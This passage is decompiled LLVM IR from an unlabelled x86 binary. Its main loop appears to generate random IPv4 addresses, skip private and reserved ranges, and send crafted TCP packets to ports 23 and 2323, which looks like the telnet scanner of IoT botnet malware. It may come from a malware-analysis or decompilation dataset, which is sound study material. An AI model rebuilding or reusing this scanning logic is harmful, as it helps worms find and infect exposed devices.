  %v3_804de39 = inttoptr i32 %v2_804de39 to i32*
  store i32 %v4_804de31, i32* %v3_804de39, align 4
  %v8_804de3c = icmp eq i32 %v4_804de31, -1
  br i1 %v8_804de3c, label %dec_label_pc_804deb3, label %dec_label_pc_804de3f

dec_label_pc_804de3f:                             ; preds = %dec_label_pc_804de2a
  %v0_804de41 = load i32, i32* @ebx, align 4
  %v1_804de41 = add i32 %v0_804de41, 28
  store i32 %v1_804de41, i32* @eax, align 4
  %v1_804de49 = add i32 %v0_804de41, 24
  %v2_804de49 = inttoptr i32 %v1_804de49 to i32*
  store i32 0, i32* %v2_804de49, align 4
  %v0_804de50 = load i32, i32* @eax, align 4
  %v2_804de51 = call i32 @function_804fda0(i32 %v0_804de50, i32 256)
  %v0_804de59 = load i32, i32* @ebx, align 4
  %v1_804de59 = add i32 %v0_804de59, 4
  %v2_804de59 = inttoptr i32 %v1_804de59 to i32*
  %v3_804de59 = load i32, i32* %v2_804de59, align 4
  %v3_804de61 = call i32 @function_805019d(i32 %v3_804de59, i32 3, i32 0)
  %v0_804de69 = load i32, i32* @ebx, align 4
  %v1_804de69 = add i32 %v0_804de69, 4
  %v2_804de69 = inttoptr i32 %v1_804de69 to i32*
  %v3_804de69 = load i32, i32* %v2_804de69, align 4
  %v12_804de6c = or i32 %v3_804de61, 2048
  %v3_804de73 = call i32 @function_805019d(i32 %v3_804de69, i32 4, i32 %v12_804de6c)
  %v0_804de78 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804de8e = load i32, i32* @global_var_80543d0.9, align 16
  %v2_804de93 = add i32 %v0_804de78, 8
  %v3_804de93 = inttoptr i32 %v2_804de93 to i32*
  store i32 %v0_804de8e, i32* %v3_804de93, align 4
  %v2_804de96 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804de9d = load i32, i32* @ebx, align 4
  %v1_804de9d = add i32 %v0_804de9d, 4
  %v2_804de9d = inttoptr i32 %v1_804de9d to i32*
  %v3_804de9d = load i32, i32* %v2_804de9d, align 4
  store i32 %v3_804de9d, i32* %edx.global-to-local, align 4
  %v1_804dea0 = add i32 %v0_804de9d, 12
  %v2_804dea0 = inttoptr i32 %v1_804dea0 to i32*
  store i32 1, i32* %v2_804dea0, align 4
  %v0_804deaa = load i32, i32* %edx.global-to-local, align 4
  %v3_804deab = call i32 @function_805083c(i32 %v0_804deaa, i32 %v2_804de96, i32 16)
  br label %dec_label_pc_804deb3

dec_label_pc_804deb3:                             ; preds = %dec_label_pc_804de2a, %dec_label_pc_804de3f
  %v0_804deb7 = phi i32 [ %v3_804deab, %dec_label_pc_804de3f ], [ 0, %dec_label_pc_804de2a ]
  store i32 %v0_804ddf0, i32* @ebx, align 4
  ret i32 %v0_804deb7

; uselistorder directives
  uselistorder i32 %v3_804de16, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804deb3, { 1, 0 }
  uselistorder label %dec_label_pc_804de2a, { 1, 0 }
}

define i32 @function_804e2de() local_unnamed_addr {
dec_label_pc_804e2de:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804e8dd, %dec_label_pc_804e2de
  %v0_804e2de = load i32, i32* @global_var_80543d0.9, align 16
  store i32 %v0_804e2de, i32* @esi, align 4
  %v0_804e2e4 = load i32, i32* @esp, align 4
  %v1_804e2e4 = add i32 %v0_804e2e4, 24
  %v2_804e2e4 = inttoptr i32 %v1_804e2e4 to i32*
  %v3_804e2e4 = load i32, i32* %v2_804e2e4, align 4
  %v15_804e2e4 = icmp eq i32 %v3_804e2e4, %v0_804e2de
  br i1 %v15_804e2e4, label %dec_label_pc_804e62b, label %dec_label_pc_804e2ee

dec_label_pc_804e2ee:                             ; preds = %.loopexit
  %v1_804e2ee = add i32 %v0_804e2e4, 1828
  store i32 %v1_804e2ee, i32* @ebp, align 4
  %v1_804e2f5 = add i32 %v0_804e2e4, 1868
  %v2_804e2f5 = inttoptr i32 %v1_804e2f5 to i32*
  store i32 0, i32* %v2_804e2f5, align 4
  %v0_804e4f0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e4f0

dec_label_pc_804e305:                             ; preds = %dec_label_pc_804e564
  switch i8 %v2_804e547, label %dec_label_pc_804e320 [
    i8 -84, label %dec_label_pc_804e5b0
    i8 100, label %dec_label_pc_804e30e.dec_label_pc_804e57b_crit_edge
    i8 -87, label %dec_label_pc_804e5cb
  ]

dec_label_pc_804e30e.dec_label_pc_804e57b_crit_edge: ; preds = %dec_label_pc_804e305
  %.pre = trunc i32 %v2_804e53e to i8
  br label %dec_label_pc_804e57b

dec_label_pc_804e317:                             ; preds = %dec_label_pc_804e572
  %v11_804e317 = icmp eq i8 %v2_804e547, -87
  br i1 %v11_804e317, label %dec_label_pc_804e5cb, label %dec_label_pc_804e320

dec_label_pc_804e320:                             ; preds = %dec_label_pc_804e305, %dec_label_pc_804e5c2, %dec_label_pc_804e317
  %v0_804e320 = phi i32 [ %v0_804e5c2, %dec_label_pc_804e5c2 ], [ %v5_804e53c, %dec_label_pc_804e317 ], [ %v5_804e53c, %dec_label_pc_804e305 ]
  %v0_804e33758 = phi i32 [ %v0_804e5b9, %dec_label_pc_804e5c2 ], [ %v2_804e53e, %dec_label_pc_804e317 ], [ %v2_804e53e, %dec_label_pc_804e305 ]
  %v1_804e320 = trunc i32 %v0_804e320 to i8
  %v11_804e320 = icmp eq i8 %v1_804e320, -58
  br i1 %v11_804e320, label %dec_label_pc_804e592, label %dec_label_pc_804e329

dec_label_pc_804e329:                             ; preds = %dec_label_pc_804e5cb, %dec_label_pc_804e589, %dec_label_pc_804e320
  %v0_804e329 = phi i32 [ %v0_804e32965, %dec_label_pc_804e5cb ], [ %v5_804e53c, %dec_label_pc_804e589 ], [ %v0_804e320, %dec_label_pc_804e320 ]
  %v0_804e33757 = phi i32 [ %v0_804e5cb, %dec_label_pc_804e5cb ], [ %v2_804e53e, %dec_label_pc_804e589 ], [ %v0_804e33758, %dec_label_pc_804e320 ]
  %v1_804e329 = trunc i32 %v0_804e329 to i8
  %tmp252 = icmp ult i8 %v1_804e329, -32
  br i1 %tmp252, label %dec_label_pc_804e332, label %dec_label_pc_804e531.preheader

dec_label_pc_804e332:                             ; preds = %dec_label_pc_804e57b, %dec_label_pc_804e592, %dec_label_pc_804e5b0.dec_label_pc_804e332_crit_edge, %dec_label_pc_804e329
  %v0_804e3f5 = phi i32 [ %v0_804e5b9, %dec_label_pc_804e5b0.dec_label_pc_804e332_crit_edge ], [ %v0_804e33757, %dec_label_pc_804e329 ], [ %v0_804e59b, %dec_label_pc_804e592 ], [ %v2_804e53e, %dec_label_pc_804e57b ]
  %v0_804e403 = phi i32 [ %v0_804e332.pre, %dec_label_pc_804e5b0.dec_label_pc_804e332_crit_edge ], [ %v0_804e329, %dec_label_pc_804e329 ], [ %v0_804e33254, %dec_label_pc_804e592 ], [ %v5_804e53c, %dec_label_pc_804e57b ]
  %v1_804e332 = trunc i32 %v0_804e403 to i8
  %v10_804e332 = icmp eq i8 %v1_804e332, 106
  %tmp253 = and i32 %v0_804e3f5, 252
  %switch = icmp eq i32 %tmp253, 184
  %or.cond153 = and i1 %switch, %v10_804e332
  br i1 %or.cond153, label %dec_label_pc_804e531.preheader, label %dec_label_pc_804e35b

dec_label_pc_804e35b:                             ; preds = %dec_label_pc_804e332
  switch i8 %v1_804e332, label %dec_label_pc_804e37f [
    i8 -106, label %dec_label_pc_804e5d9
    i8 49, label %dec_label_pc_804e5f9
    i8 -78, label %dec_label_pc_804e5eb
    i8 -96, label %dec_label_pc_804e60b
  ]

dec_label_pc_804e37f:                             ; preds = %dec_label_pc_804e5f9, %dec_label_pc_804e5d9, %dec_label_pc_804e35b, %dec_label_pc_804e60b, %dec_label_pc_804e5eb
  %v1_804e37f = add i32 %v0_804e403, -6
  store i32 %v1_804e37f, i32* %eax.global-to-local, align 4
  %v1_804e382 = trunc i32 %v1_804e37f to i8
  %tmp254 = or i8 %v1_804e382, 1
  %tmp255 = icmp eq i8 %tmp254, 1
  br i1 %tmp255, label %dec_label_pc_804e531.preheader, label %switch.early.test

switch.early.test:                                ; preds = %dec_label_pc_804e37f
  switch i8 %v1_804e332, label %dec_label_pc_804e3ed [
    i8 -41, label %dec_label_pc_804e531.preheader
    i8 -42, label %dec_label_pc_804e531.preheader
    i8 55, label %dec_label_pc_804e531.preheader
    i8 33, label %dec_label_pc_804e531.preheader
    i8 30, label %dec_label_pc_804e531.preheader
    i8 29, label %dec_label_pc_804e531.preheader
    i8 28, label %dec_label_pc_804e531.preheader
    i8 26, label %dec_label_pc_804e531.preheader
    i8 22, label %dec_label_pc_804e531.preheader
    i8 21, label %dec_label_pc_804e531.preheader
    i8 11, label %dec_label_pc_804e531.preheader
  ]

dec_label_pc_804e3ed:                             ; preds = %switch.early.test
  %v0_804e3ef = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_80543aa.10 to i16*), align 4
  %v1_804e3f5 = mul i32 %v0_804e3f5, 65536
  %v2_804e400 = and i32 %v1_804e3f5, 16711680
  %v2_804e403 = mul i32 %v0_804e403, 16777216
  %v1_804e3ef = mul i32 %v0_804e3ef, 256
  %v2_804e409 = or i32 %v2_804e400, %v2_804e403
  %v0_804e40b = load i32, i32* @edi, align 4
  %v1_804e40d = urem i32 %v0_804e40b, 256
  store i32 %v1_804e40d, i32* %eax.global-to-local, align 4
  %v2_804e412 = or i32 %v1_804e40d, %v2_804e409
  store i32 %v2_804e412, i32* %ecx.global-to-local, align 4
  %v2_804e414 = or i32 %v1_804e40d, %v1_804e3ef
  %v1_804e416 = load i32, i32* @esp, align 4
  %v2_804e416 = add i32 %v1_804e416, -4
  %v3_804e416 = inttoptr i32 %v2_804e416 to i32*
  store i32 %v2_804e412, i32* %v3_804e416, align 4
  %v1_804e417 = trunc i32 %v2_804e414 to i16
  %v2_804e417 = call i16 @llvm.bswap.i16(i16 %v1_804e417)
  %v3_804e417 = zext i16 %v2_804e417 to i32
  %v1_804e41b = udiv i32 %v2_804e409, 65536
  %v2_804e41b = mul nuw i32 %v3_804e417, 65536
  %v1_804e41e = trunc i32 %v1_804e41b to i16
  %v2_804e41e = call i16 @llvm.bswap.i16(i16 %v1_804e41e)
  %v3_804e41e = zext i16 %v2_804e41e to i32
  %v6_804e41e = or i32 %v2_804e41b, %v3_804e41e
  store i32 %v6_804e41e, i32* %edx.global-to-local, align 4
  %v0_804e422 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e422 = add i32 %v1_804e416, -8
  %v3_804e422 = inttoptr i32 %v2_804e422 to i32*
  store i32 %v0_804e422, i32* %v3_804e422, align 4
  %v0_804e423 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e423, i32* @global_var_80543b0.11, align 16
  %v1_804e429 = add i32 %v1_804e416, -12
  %v2_804e429 = inttoptr i32 %v1_804e429 to i32*
  store i32 20, i32* %v2_804e429, align 4
  %v1_804e42b = add i32 %v1_804e416, -16
  %v2_804e42b = inttoptr i32 %v1_804e42b to i32*
  store i32 ptrtoint (i32* @global_var_80543a0.12 to i32), i32* %v2_804e42b, align 4
  %v0_804e430 = call i32 @function_804bd90()
  %v1_804e430 = trunc i32 %v0_804e430 to i16
  store i32 %v0_804e430, i32* %eax.global-to-local, align 4
  %v0_804e435 = load i32, i32* @esp, align 4
  %v1_804e435 = add i32 %v0_804e435, 1884
  %v2_804e435 = inttoptr i32 %v1_804e435 to i32*
  %v3_804e435 = load i32, i32* %v2_804e435, align 4
  store i16 %v1_804e430, i16* bitcast (i32* @global_var_80543aa.10 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_804e44b = ashr i32 %v3_804e435, 31
  %v2_804e451 = zext i32 %v3_804e435 to i64
  %v4_804e451 = zext i32 %v2_804e44b to i64
  %v5_804e451 = mul nuw i64 %v4_804e451, 4294967296
  %v6_804e451 = or i64 %v5_804e451, %v2_804e451
  %v10_804e451 = srem i64 %v6_804e451, 10
  %v11_804e451 = trunc i64 %v10_804e451 to i32
  store i32 %v11_804e451, i32* %edx.global-to-local, align 4
  %v1_804e453 = icmp eq i32 %v11_804e451, 0
  %v1_804e455 = icmp eq i1 %v1_804e453, false
  %. = select i1 %v1_804e455, i16 5888, i16 4873
  store i16 %., i16* @global_var_80543b6.13, align 2
  %v0_804e464 = load i32, i32* @global_var_80543b0.11, align 16
  store i32 %v0_804e464, i32* %eax.global-to-local, align 4
  %v1_804e469 = add i32 %v0_804e435, 12
  %v2_804e469 = inttoptr i32 %v1_804e469 to i32*
  store i32 20, i32* %v2_804e469, align 4
  %v0_804e46b = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804e46b, i32* @global_var_80543b8.14, align 8
  %v1_804e470 = add i32 %v0_804e435, 8
  %v2_804e470 = inttoptr i32 %v1_804e470 to i32*
  store i32 5120, i32* %v2_804e470, align 4
  store i16 0, i16* bitcast (i32* @global_var_80543c4.15 to i16*), align 4
  %v1_804e47e = add i32 %v0_804e435, 4
  %v2_804e47e = inttoptr i32 %v1_804e47e to i32*
  store i32 ptrtoint (i32* @global_var_80543b4.16 to i32), i32* %v2_804e47e, align 4
  %v2_804e483 = inttoptr i32 %v0_804e435 to i32*
  store i32 ptrtoint (i32* @global_var_80543a0.12 to i32), i32* %v2_804e483, align 4
  %v0_804e488 = call i32 @function_804bde0()
  %v1_804e488 = trunc i32 %v0_804e488 to i16
  store i16 %v1_804e488, i16* bitcast (i32* @global_var_80543c4.15 to i16*), align 4
  %v0_804e493 = load i32, i32* @global_var_80543b0.11, align 16
  store i32 %v0_804e493, i32* %eax.global-to-local, align 4
  %v1_804e498 = load i32, i32* @esp, align 4
  %v2_804e498 = add i32 %v1_804e498, 1848
  %v3_804e498 = inttoptr i32 %v2_804e498 to i32*
  store i32 %v0_804e493, i32* %v3_804e498, align 4
  %v0_804e49f = load i16, i16* @global_var_80543b6.13, align 2
  %v1_804e49f = zext i16 %v0_804e49f to i32
  %v2_804e49f = load i32, i32* %eax.global-to-local, align 4
  %v3_804e49f = and i32 %v2_804e49f, -65536
  %v4_804e49f = or i32 %v3_804e49f, %v1_804e49f
  store i32 %v4_804e49f, i32* %eax.global-to-local, align 4
  %v0_804e4a5 = load i32, i32* @esp, align 4
  %v1_804e4a5 = add i32 %v0_804e4a5, 1844
  %v2_804e4a5 = inttoptr i32 %v1_804e4a5 to i16*
  store i16 2, i16* %v2_804e4a5, align 2
  %v0_804e4af = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4af = trunc i32 %v0_804e4af to i16
  %v2_804e4af = load i32, i32* @esp, align 4
  %v3_804e4af = add i32 %v2_804e4af, 1846
  %v4_804e4af = inttoptr i32 %v3_804e4af to i16*
  store i16 %v1_804e4af, i16* %v4_804e4af, align 2
  %v0_804e4b7 = load i32, i32* @esp, align 4
  %v1_804e4b7 = inttoptr i32 %v0_804e4b7 to i32*
  %v3_804e4b7 = add i32 %v0_804e4b7, 4
  %v0_804e4b8 = load i32, i32* @global_var_805441c.17, align 4
  store i32 %v0_804e4b8, i32* %eax.global-to-local, align 4
  %v1_804e4bd = inttoptr i32 %v3_804e4b7 to i32*
  %v2_804e4bd = load i32, i32* %v1_804e4bd, align 4
  store i32 %v2_804e4bd, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_804e4bd, align 4
  %v0_804e4c0 = load i32, i32* @ebp, align 4
  store i32 %v0_804e4c0, i32* %v1_804e4b7, align 4
  %v1_804e4c1 = add i32 %v0_804e4b7, -4
  %v2_804e4c1 = inttoptr i32 %v1_804e4c1 to i32*
  store i32 16384, i32* %v2_804e4c1, align 4
  %v1_804e4c6 = add i32 %v0_804e4b7, -8
  %v2_804e4c6 = inttoptr i32 %v1_804e4c6 to i32*
  store i32 40, i32* %v2_804e4c6, align 4
  %v1_804e4c8 = add i32 %v0_804e4b7, -12
  %v2_804e4c8 = inttoptr i32 %v1_804e4c8 to i32*
  store i32 ptrtoint (i32* @global_var_80543a0.12 to i32), i32* %v2_804e4c8, align 4
  %v0_804e4cd = load i32, i32* %eax.global-to-local, align 4
  %v2_804e4cd = add i32 %v0_804e4b7, -16
  %v3_804e4cd = inttoptr i32 %v2_804e4cd to i32*
  store i32 %v0_804e4cd, i32* %v3_804e4cd, align 4
  %v0_804e4ce = call i32 @function_8050999()
  store i32 %v0_804e4ce, i32* %eax.global-to-local, align 4
  %v0_804e4d3 = load i32, i32* @esp, align 4
  %v1_804e4d3 = add i32 %v0_804e4d3, 1900
  %v2_804e4d3 = inttoptr i32 %v1_804e4d3 to i32*
  %v3_804e4d3 = load i32, i32* %v2_804e4d3, align 4
  %v1_804e4da = add i32 %v3_804e4d3, 1
  store i32 %v1_804e4da, i32* %eax.global-to-local, align 4
  store i32 %v1_804e4da, i32* %v2_804e4d3, align 4
  %v0_804e4e2 = load i32, i32* @esp, align 4
  %v1_804e4e2 = add i32 %v0_804e4e2, 32
  %v0_804e4e5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4e5 = add i32 %v0_804e4e5, -383
  %v6_804e4e5 = sub i32 382, %v0_804e4e5
  %v7_804e4e5 = and i32 %v6_804e4e5, %v0_804e4e5
  %v8_804e4e5 = icmp slt i32 %v7_804e4e5, 0
  %v9_804e4e5 = icmp eq i32 %v1_804e4e5, 0
  %v10_804e4e5 = icmp slt i32 %v1_804e4e5, 0
  %v3_804e4ea = icmp eq i1 %v10_804e4e5, %v8_804e4e5
  %v4_804e4ea = icmp eq i1 %v9_804e4e5, false
  %v5_804e4ea = and i1 %v4_804e4ea, %v3_804e4ea
  br i1 %v5_804e4ea, label %dec_label_pc_804e627, label %dec_label_pc_804e4f0

dec_label_pc_804e4f0:                             ; preds = %dec_label_pc_804e3ed, %dec_label_pc_804e2ee
  %v0_804e4f0 = phi i32 [ %v1_804e4e2, %dec_label_pc_804e3ed ], [ %v0_804e4f0.pre, %dec_label_pc_804e2ee ]
  %v1_804e4f0 = add i32 %v0_804e4f0, 1828
  %v2_804e4f0 = inttoptr i32 %v1_804e4f0 to i32*
  store i32 0, i32* %v2_804e4f0, align 4
  %v0_804e4fb = load i32, i32* @esp, align 4
  %v1_804e4fb = add i32 %v0_804e4fb, 1832
  %v2_804e4fb = inttoptr i32 %v1_804e4fb to i32*
  store i32 0, i32* %v2_804e4fb, align 4
  %v0_804e506 = load i32, i32* @esp, align 4
  %v1_804e506 = add i32 %v0_804e506, 1836
  %v2_804e506 = inttoptr i32 %v1_804e506 to i32*
  store i32 0, i32* %v2_804e506, align 4
  %v0_804e511 = load i32, i32* @esp, align 4
  %v1_804e511 = add i32 %v0_804e511, 1840
  %v2_804e511 = inttoptr i32 %v1_804e511 to i32*
  store i32 0, i32* %v2_804e511, align 4
  %v1_804e51c = call i32 @function_804d6e0(i32 ptrtoint (i32* @0 to i32))
  %v2_804e51c = trunc i32 %v1_804e51c to i16
  store i16 %v2_804e51c, i16* bitcast (i32* @global_var_80543a4.18 to i16*), align 4
  %v0_804e527 = load i32, i32* @global_var_80543fc.19, align 4
  store i32 %v0_804e527, i32* %eax.global-to-local, align 4
  store i32 %v0_804e527, i32* @global_var_80543ac.20, align 4
  br label %dec_label_pc_804e531.preheader

dec_label_pc_804e531.preheader:                   ; preds = %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %dec_label_pc_804e37f, %dec_label_pc_804e332, %dec_label_pc_804e592, %dec_label_pc_804e4f0, %dec_label_pc_804e5b9, %dec_label_pc_804e5d9, %dec_label_pc_804e5f9, %dec_label_pc_804e329, %dec_label_pc_804e5cb, %dec_label_pc_804e5eb, %dec_label_pc_804e60b
  br label %dec_label_pc_804e531

dec_label_pc_804e531:                             ; preds = %switch.early.test251, %switch.early.test251, %dec_label_pc_804e553, %dec_label_pc_804e531, %dec_label_pc_804e531, %dec_label_pc_804e531, %dec_label_pc_804e584, %dec_label_pc_804e56d, %dec_label_pc_804e531.preheader
  %v1_804e531 = call i32 @function_804d6e0(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e531, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v1_804e531, 65536
  %v1_804e536 = sdiv i32 %sext, 65536
  %v2_804e53c = urem i32 %v1_804e531, 256
  %v3_804e53c = load i32, i32* @ecx, align 4
  %v4_804e53c = and i32 %v3_804e53c, -256
  %v5_804e53c = or i32 %v4_804e53c, %v2_804e53c
  store i32 %v5_804e53c, i32* @ecx, align 4
  %v2_804e53e = udiv i32 %v1_804e536, 256
  store i32 %v2_804e53e, i32* @ebx, align 4
  %v2_804e541 = udiv i32 %v1_804e536, 65536
  store i32 %v2_804e541, i32* @edx, align 4
  %v2_804e544 = udiv i32 %v1_804e536, 16777216
  store i32 %v2_804e544, i32* @edi, align 4
  %v2_804e547 = trunc i32 %v1_804e531 to i8
  switch i8 %v2_804e547, label %dec_label_pc_804e553 [
    i8 127, label %dec_label_pc_804e531
    i8 0, label %dec_label_pc_804e531
    i8 3, label %dec_label_pc_804e531
  ]

dec_label_pc_804e553:                             ; preds = %dec_label_pc_804e531
  %v2_804e553 = add nsw i32 %v1_804e536, -15
  store i32 %v2_804e553, i32* %eax.global-to-local, align 4
  %v1_804e556 = trunc i32 %v2_804e553 to i8
  %tmp256 = or i8 %v1_804e556, 1
  %tmp257 = icmp eq i8 %tmp256, 1
  br i1 %tmp257, label %dec_label_pc_804e531, label %switch.early.test251

switch.early.test251:                             ; preds = %dec_label_pc_804e553
  switch i8 %v2_804e547, label %dec_label_pc_804e564 [
    i8 56, label %dec_label_pc_804e531
    i8 10, label %dec_label_pc_804e531
  ]

dec_label_pc_804e564:                             ; preds = %switch.early.test251
  %v8_804e564 = icmp eq i8 %v2_804e547, -64
  %v1_804e567 = icmp eq i1 %v8_804e564, false
  br i1 %v1_804e567, label %dec_label_pc_804e305, label %dec_label_pc_804e56d

dec_label_pc_804e56d:                             ; preds = %dec_label_pc_804e564
  %v1_804e56d = trunc i32 %v2_804e53e to i8
  %v11_804e56d = icmp eq i8 %v1_804e56d, -88
  br i1 %v11_804e56d, label %dec_label_pc_804e531, label %dec_label_pc_804e572

dec_label_pc_804e572:                             ; preds = %dec_label_pc_804e56d
  %v10_804e572 = icmp eq i8 %v2_804e547, 100
  %v1_804e575 = icmp eq i1 %v10_804e572, false
  br i1 %v1_804e575, label %dec_label_pc_804e317, label %dec_label_pc_804e57b

dec_label_pc_804e57b:                             ; preds = %dec_label_pc_804e30e.dec_label_pc_804e57b_crit_edge, %dec_label_pc_804e572
  %v1_804e57b.pre-phi = phi i8 [ %.pre, %dec_label_pc_804e30e.dec_label_pc_804e57b_crit_edge ], [ %v1_804e56d, %dec_label_pc_804e572 ]
  %tmp258 = icmp ult i8 %v1_804e57b.pre-phi, 64
  br i1 %tmp258, label %dec_label_pc_804e332, label %dec_label_pc_804e584

dec_label_pc_804e584:                             ; preds = %dec_label_pc_804e57b
  %tmp259 = icmp ult i8 %v1_804e57b.pre-phi, 127
  br i1 %tmp259, label %dec_label_pc_804e531, label %dec_label_pc_804e589

dec_label_pc_804e589:                             ; preds = %dec_label_pc_804e584
  %v11_804e589 = icmp eq i8 %v2_804e547, -58
  %v1_804e58c = icmp eq i1 %v11_804e589, false
  br i1 %v1_804e58c, label %dec_label_pc_804e329, label %dec_label_pc_804e592

dec_label_pc_804e592:                             ; preds = %dec_label_pc_804e589, %dec_label_pc_804e320
  %v0_804e59b = phi i32 [ %v2_804e53e, %dec_label_pc_804e589 ], [ %v0_804e33758, %dec_label_pc_804e320 ]
  %v0_804e33254 = phi i32 [ %v5_804e53c, %dec_label_pc_804e589 ], [ %v0_804e320, %dec_label_pc_804e320 ]
  %v1_804e592 = trunc i32 %v0_804e59b to i8
  %tmp260 = icmp ugt i8 %v1_804e592, 17
  %tmp261 = or i8 %v1_804e592, 1
  %tmp262 = icmp eq i8 %tmp261, 19
  %or.cond140 = and i1 %tmp260, %tmp262
  br i1 %or.cond140, label %dec_label_pc_804e531.preheader, label %dec_label_pc_804e332

dec_label_pc_804e5a5:                             ; preds = %dec_label_pc_804f4ea
  store i32 0, i32* %v2_804e5a8, align 4
  %v1_804e5aa = call i32 @function_8051d53(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e5aa, i32* %eax.global-to-local, align 4
  %v0_804e5b0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e5b0

dec_label_pc_804e5b0:                             ; preds = %dec_label_pc_804e305, %dec_label_pc_804e5a5
  %v0_804e5b9 = phi i32 [ %v0_804e5b0.pre, %dec_label_pc_804e5a5 ], [ %v2_804e53e, %dec_label_pc_804e305 ]
  %v1_804e5b0 = trunc i32 %v0_804e5b9 to i8
  %tmp263 = icmp ult i8 %v1_804e5b0, 16
  br i1 %tmp263, label %dec_label_pc_804e5b0.dec_label_pc_804e332_crit_edge, label %dec_label_pc_804e5b9

dec_label_pc_804e5b0.dec_label_pc_804e332_crit_edge: ; preds = %dec_label_pc_804e5b0
  %v0_804e332.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e332

dec_label_pc_804e5b9:                             ; preds = %dec_label_pc_804e5b0
  %tmp264 = icmp ult i8 %v1_804e5b0, 32
  br i1 %tmp264, label %dec_label_pc_804e531.preheader, label %dec_label_pc_804e5c2

dec_label_pc_804e5c2:                             ; preds = %dec_label_pc_804e5b9
  %v0_804e5c2 = load i32, i32* @ecx, align 4
  %v1_804e5c2 = trunc i32 %v0_804e5c2 to i8
  %v11_804e5c2 = icmp eq i8 %v1_804e5c2, -87
  %v1_804e5c5 = icmp eq i1 %v11_804e5c2, false
  br i1 %v1_804e5c5, label %dec_label_pc_804e320, label %dec_label_pc_804e5cb

dec_label_pc_804e5cb:                             ; preds = %dec_label_pc_804e305, %dec_label_pc_804e5c2, %dec_label_pc_804e317
  %v0_804e32965 = phi i32 [ %v0_804e5c2, %dec_label_pc_804e5c2 ], [ %v5_804e53c, %dec_label_pc_804e317 ], [ %v5_804e53c, %dec_label_pc_804e305 ]
  %v0_804e5cb = phi i32 [ %v0_804e5b9, %dec_label_pc_804e5c2 ], [ %v2_804e53e, %dec_label_pc_804e317 ], [ %v2_804e53e, %dec_label_pc_804e305 ]
  %v1_804e5cb = trunc i32 %v0_804e5cb to i8
  %v11_804e5cb = icmp eq i8 %v1_804e5cb, -1
  %v1_804e5ce = icmp eq i1 %v11_804e5cb, false
  br i1 %v1_804e5ce, label %dec_label_pc_804e329, label %dec_label_pc_804e531.preheader

dec_label_pc_804e5d9:                             ; preds = %dec_label_pc_804e35b
  %v1_804e5d9 = trunc i32 %v0_804e3f5 to i8
  %v10_804e5d9 = icmp eq i8 %v1_804e5d9, 31
  br i1 %v10_804e5d9, label %dec_label_pc_804e531.preheader, label %dec_label_pc_804e37f

dec_label_pc_804e5eb:                             ; preds = %dec_label_pc_804e35b
  %.pre105 = trunc i32 %v0_804e3f5 to i8
  %v10_804e5eb = icmp eq i8 %.pre105, 62
  %v1_804e5ee = icmp eq i1 %v10_804e5eb, false
  br i1 %v1_804e5ee, label %dec_label_pc_804e37f, label %dec_label_pc_804e531.preheader

dec_label_pc_804e5f9:                             ; preds = %dec_label_pc_804e35b
  %v1_804e5f9 = trunc i32 %v0_804e3f5 to i8
  %v10_804e5f9 = icmp eq i8 %v1_804e5f9, 51
  br i1 %v10_804e5f9, label %dec_label_pc_804e531.preheader, label %dec_label_pc_804e37f

dec_label_pc_804e60b:                             ; preds = %dec_label_pc_804e35b
  %.pre104 = trunc i32 %v0_804e3f5 to i8
  %v10_804e60b = icmp eq i8 %.pre104, 13
  %v1_804e60e = icmp eq i1 %v10_804e60b, false
  br i1 %v1_804e60e, label %dec_label_pc_804e37f, label %dec_label_pc_804e531.preheader

dec_label_pc_804e627:                             ; preds = %dec_label_pc_804e3ed
  %v0_804e627 = load i32, i32* @esi, align 4
  %v2_804e627 = add i32 %v0_804e4e2, 56
  %v3_804e627 = inttoptr i32 %v2_804e627 to i32*
  store i32 %v0_804e627, i32* %v3_804e627, align 4
  br label %dec_label_pc_804e62b

dec_label_pc_804e62b:                             ; preds = %.loopexit, %dec_label_pc_804e627
  %v1_804e62b = call i32 @function_805076b(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e62b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804e632 = load i32, i32* @esp, align 4
  %v2_804e632 = add i32 %v1_804e632, 40
  %v3_804e632 = inttoptr i32 %v2_804e632 to i32*
  store i32 %v1_804e62b, i32* %v3_804e632, align 4
  br label %dec_label_pc_804e636

dec_label_pc_804e636:                             ; preds = %dec_label_pc_804e691, %dec_label_pc_804e6d3, %dec_label_pc_804e6cb, %dec_label_pc_804e6c3, %dec_label_pc_804e6af, %dec_label_pc_804e6a3, %dec_label_pc_804e68a, %dec_label_pc_804e67e, %dec_label_pc_804e679, %dec_label_pc_804e735, %dec_label_pc_804e62b
  %v0_804e636 = load i32, i32* @esp, align 4
  %v1_804e636 = add i32 %v0_804e636, 40
  %v2_804e636 = inttoptr i32 %v1_804e636 to i32*
  %v3_804e636 = load i32, i32* %v2_804e636, align 4
  store i32 %v3_804e636, i32* %eax.global-to-local, align 4
  %v1_804e63a = inttoptr i32 %v3_804e636 to i32*
  store i32 0, i32* %v1_804e63a, align 4
  %v0_804e640 = load i32, i32* @edi, align 4
  %v1_804e640 = load i32, i32* @esp, align 4
